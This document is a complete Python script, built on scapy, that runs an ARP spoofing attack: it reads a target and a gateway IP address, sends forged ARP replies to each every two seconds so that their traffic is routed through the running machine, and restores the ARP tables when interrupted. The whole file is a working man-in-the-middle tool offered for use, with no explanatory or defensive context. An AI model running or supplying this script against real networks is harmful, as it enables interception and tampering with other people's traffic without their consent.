#!/user/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='Target device IP address')
    parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP address')
    options = parser.parse_args()
    if not options.target:
        parser.error('Please select valid IP addresses. Use --help for info.')
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='FF:FF:FF:FF:FF:FF')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


spoof_addresses = get_arguments()
target_ip = spoof_addresses.target
gateway_ip = spoof_addresses.gateway


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print('\r[+] Packets sent: ' + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Detected Ctrl+C ... Resetting ARP tables, please wait.')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
